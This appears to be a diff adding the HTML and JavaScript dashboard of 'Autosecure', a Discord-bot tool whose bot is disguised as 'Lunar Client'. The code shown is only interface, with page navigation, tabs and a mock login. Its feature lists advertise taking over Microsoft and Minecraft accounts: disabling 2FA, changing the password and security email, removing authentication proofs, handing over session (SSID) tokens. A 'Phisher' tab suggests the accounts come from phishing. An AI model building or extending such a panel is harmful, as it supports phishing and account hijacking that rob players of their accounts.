+                    </div>
+
+                    <div class="glass-panel recent-secures-panel">
+                        <div class="panel-header">
+                            <h3>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;">
+                                    <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                                    <path d="m9 12 2 2 4-4"></path>
+                                </svg>
+                                Recent Secures
+                            </h3>
+                            <span class="panel-count">0 accounts</span>
+                        </div>
+                        <div class="empty-state">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.3;">
+                                <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                                <path d="m9 12 2 2 4-4"></path>
+                            </svg>
+                            <p>No secured accounts yet</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bots Content -->
+            <div id="botsContent" class="hidden">
+                <div class="bots-page">
+                    <header class="page-header">
+                        <h1>My Bots</h1>
+                        <p>Manage and configure your Discord bots.</p>
+                    </header>
+
+                    <div class="bots-grid">
+                        <div class="bot-card">
+                            <div class="bot-icon-wrapper">
+                                <img alt="Lunar Client" class="bot-icon" src="https://cdn.discordapp.com/avatars/1457030566477299846/8f275535f641e46f9fa7196494a546d9.png?size=1024">
+                            </div>
+                            <h3 class="bot-name">Lunar Client</h3>
+                            <p class="bot-id">ID: 1457030566477299846</p>
+                            <p class="bot-date">Created: 3/1/2026</p>
+                            <button class="configure-btn">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915"></path>
+                                    <circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                                <span>Configure</span>
+                            </button>
+                        </div>
+
+                        <div class="bot-card add-bot-card">
+                            <div class="add-bot-icon-wrapper">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M5 12h14"></path>
+                                    <path d="M12 5v14"></path>
+                                </svg>
+                            </div>
+                            <h3 class="bot-name">Add Bot</h3>
+                            <p class="slots-info">
+                                <span class="slots-available">1 slot available</span>
+                            </p>
+                            <p class="slots-detail">1 / 2 used</p>
+                            <div class="add-bot-hint">Click to add a new bot</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Features Content -->
+            <div id="featuresContent" class="hidden">
+                <div class="features-container">
+                    <header class="features-header">
+                        <h1 class="features-title">Autosecure</h1>
+                        <p class="features-subtitle">Comprehensive account protection system</p>
+                    </header>
+
+                    <div class="features-layout">
+                        <div class="features-sidebar">
+                            <button class="tab-button active">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                                </svg>
+                                <span>Account Security</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="chevron-icon">
+                                    <path d="m9 18 6-6-6-6"></path>
+                                </svg>
+                            </button>
+
+                            <button class="tab-button">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"></path>
+                                    <path d="m3.3 7 8.7 5 8.7-5"></path>
+                                    <path d="M12 22V12"></path>
+                                </svg>
+                                <span>Minecraft</span>
+                            </button>
+
+                            <button class="tab-button">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <line x1="6" x2="10" y1="11" y2="11"></line>
+                                    <line x1="8" x2="8" y1="9" y2="13"></line>
+                                    <line x1="15" x2="15.01" y1="12" y2="12"></line>
+                                    <line x1="18" x2="18.01" y1="10" y2="10"></line>
+                                    <path d="M17.32 5H6.68a4 4 0 0 0-3.978 3.59c-.006.052-.01.101-.017.152C2.604 9.416 2 14.456 2 16a3 3 0 0 0 3 3c1 0 1.5-.5 2-1l1.414-1.414A2 2 0 0 1 9.828 16h4.344a2 2 0 0 1 1.414.586L17 18c.5.5 1 1 2 1a3 3 0 0 0 3-3c0-1.545-.604-6.584-.685-7.258-.007-.05-.011-.1-.017-.151A4 4 0 0 0 17.32 5z"></path>
+                                </svg>
+                                <span>Xbox</span>
+                            </button>
+
+                            <button class="tab-button">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <path d="M10 15H6a4 4 0 0 0-4 4v2"></path>
+                                    <circle cx="18" cy="15" r="3"></circle>
+                                    <circle cx="9" cy="7" r="4"></circle>
+                                </svg>
+                                <span>Account Management</span>
+                            </button>
+
+                            <button class="tab-button">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <path d="M6.5 12c.94-3.46 4.94-6 8.5-6 3.56 0 6.06 2.54 7 6-.94 3.47-3.44 6-7 6s-7.56-2.53-8.5-6Z"></path>
+                                    <path d="M18 12v.5"></path>
+                                </svg>
+                                <span>Phisher</span>
+                            </button>
+
+                            <button class="tab-button">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <path d="M12 19h8"></path>
+                                    <path d="m4 17 6-6-6-6"></path>
+                                </svg>
+                                <span>Commands & Extras</span>
+                            </button>
+
+                            <button class="tab-button">
+                                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tab-icon">
+                                    <path d="M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2"></path>
+                                </svg>
+                                <span>Live Feed</span>
+                            </button>
+                        </div>
+
+                        <div class="features-content-area">
+                            <div id="accountSecurityContent">
+                                <div class="content-header">
+                                    <h2 class="content-title">Account Security</h2>
+                                    <p class="content-description">Comprehensive account protection system.</p>
+                                </div>
+
+                                <div class="subsection-container">
+                                    <div>
+                                        <h3 class="subsection-title">Authentication & Access</h3>
+                                        <div class="items-grid">
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Disables 2FA</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Creates advanced recovery codes</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Changes security email</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Changes password</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Adds passwordless password</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Removes app passwords</span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h3 class="subsection-title">Session & Device Control</h3>
+                                        <div class="items-grid">
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Signs out from all locations</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Removes all devices</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Removes Windows Hello keys</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Removes all apps/OAuths</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Disables notifications</span>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div>
+                                        <h3 class="subsection-title">Advanced Cleanup & Claiming</h3>
+                                        <div class="items-grid">
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Removes all authentication proofs</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Secure if the account doesn't own MC</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Full info claiming</span>
+                                            </div>
+
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">SSID only claiming</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div id="minecraftContent" class="hidden">
+                                <div class="content-header">
+                                    <h2 class="content-title">Minecraft</h2>
+                                    <p class="content-description">Deep integration with Minecraft ecosystem.</p>
+                                </div>
+
+                                <div class="subsection-container">
+                                    <div>
+                                        <h3 class="subsection-title">Status & Information</h3>
+                                        <div class="items-grid">
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Checks Minecraft ownership</span>
+                                            </div>
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Grabs Minecraft username & UUID</span>
+                                            </div>
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Shows capes & cosmetics</span>
+                                            </div>
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Shows Minecoins balance</span>
+                                            </div>
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Shows Minecraft games</span>
+                                            </div>
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Multiplayer status</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div>
+                                        <h3 class="subsection-title">Technical & Tokens</h3>
+                                        <div class="items-grid">
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Provides SSID & identity token</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div>
+                                        <h3 class="subsection-title">Actions</h3>
+                                        <div class="items-grid">
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Change Minecraft username</span>
+                                            </div>
+                                            <div class="feature-item-card">
+                                                <div class="item-icon-box">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                                        <path d="M20 6 9 17l-5-5"></path>
+                                                    </svg>
+                                                </div>
+                                                <span class="item-text">Disable multiplayer</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Input validation for login
+        const keyInput = document.getElementById('keyInput');
+        const keySubmitBtn = document.getElementById('keySubmitBtn');
+
+        keyInput.addEventListener('input', function(e) {
+            keySubmitBtn.disabled = this.value.trim().length === 0;
+        });
+
+        // Login functions
+        function loginWithDiscord() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('dashboardPage').classList.remove('hidden');
+        }
+
+        function loginWithKey(event) {
+            event.preventDefault();
+            const key = keyInput.value;
+            if (key.trim()) {
+                document.getElementById('loginPage').classList.add('hidden');
+                document.getElementById('dashboardPage').classList.remove('hidden');
+            }
+        }
+
+        // Logout function
+        function logout() {
+            document.getElementById('dashboardPage').classList.add('hidden');
+            document.getElementById('loginPage').classList.remove('hidden');
+            keyInput.value = '';
+            keySubmitBtn.disabled = true;
+        }
+
+        // Page navigation
+        function showPage(page) {
+            // Update sidebar active states
+            const sidebarItems = document.querySelectorAll('.sidebar-item');
+            sidebarItems.forEach(item => {
+                item.classList.remove('active');
+                const icon = item.querySelector('svg');
+                if (icon) {
+                    icon.classList.remove('icon-active');
+                    icon.classList.add('icon-inactive');
+                }
+                const glow = item.querySelector('.active-glow');
+                if (glow) glow.remove();
+            });
+
+            // Hide all content areas
+            document.getElementById('dashboardContent').classList.add('hidden');
+            document.getElementById('botsContent').classList.add('hidden');
+            document.getElementById('featuresContent').classList.add('hidden');
+
+            // Show selected page and activate menu item
+            if (page === 'dashboard') {
+                document.getElementById('dashboardContent').classList.remove('hidden');
+                const dashboardItem = sidebarItems[0];
+                dashboardItem.classList.add('active');
+                const icon = dashboardItem.querySelector('svg');
+                icon.classList.add('icon-active');
+                icon.classList.remove('icon-inactive');
+                const glow = document.createElement('div');
+                glow.className = 'active-glow';
+                dashboardItem.appendChild(glow);
+            } else if (page === 'bots') {
+                document.getElementById('botsContent').classList.remove('hidden');
+                const botsItem = sidebarItems[1];
+                botsItem.classList.add('active');
+                const icon = botsItem.querySelector('svg');
+                icon.classList.add('icon-active');
+                icon.classList.remove('icon-inactive');
+                const glow = document.createElement('div');
+                glow.className = 'active-glow';
+                botsItem.appendChild(glow);
+            } else if (page === 'features') {
+                document.getElementById('featuresContent').classList.remove('hidden');
+                const featuresItem = sidebarItems[2];
+                featuresItem.classList.add('active');
+                const icon = featuresItem.querySelector('svg');
+                icon.classList.add('icon-active');
+                icon.classList.remove('icon-inactive');
+                const glow = document.createElement('div');
+                glow.className = 'active-glow';
+                featuresItem.appendChild(glow);
+            }
+        }
+
+        // Handle feature tabs switching
+        function setupFeatureTabs() {
+            const buttons = document.querySelectorAll('.features-sidebar .tab-button');
+            const accountSecurityContent = document.getElementById('accountSecurityContent');
+            const minecraftContent = document.getElementById('minecraftContent');
+            
+            if (!buttons.length) {
+                console.error('No tab buttons found');
+                return;
+            }
+            
+            buttons.forEach((button, index) => {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    // Remove active class from all buttons
+                    buttons.forEach(btn => btn.classList.remove('active'));
+                    
+                    // Add active class to clicked button
+                    button.classList.add('active');
+                    
+                    // Hide all content
+                    if (accountSecurityContent) {
+                        accountSecurityContent.style.display = 'none';
+                    }
+                    if (minecraftContent) {
+                        minecraftContent.style.display = 'none';
+                    }
+                    
+                    // Show selected content
+                    if (index === 0 && accountSecurityContent) {
+                        accountSecurityContent.style.display = 'block';
+                    } else if (index === 1 && minecraftContent) {
+                        minecraftContent.style.display = 'block';
+                    }
+                });
+            });
+        }
+        
+        // Setup tabs when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', setupFeatureTabs);
+        } else {
+            setupFeatureTabs();
+        }
+    </script>
+</body>
+</html>
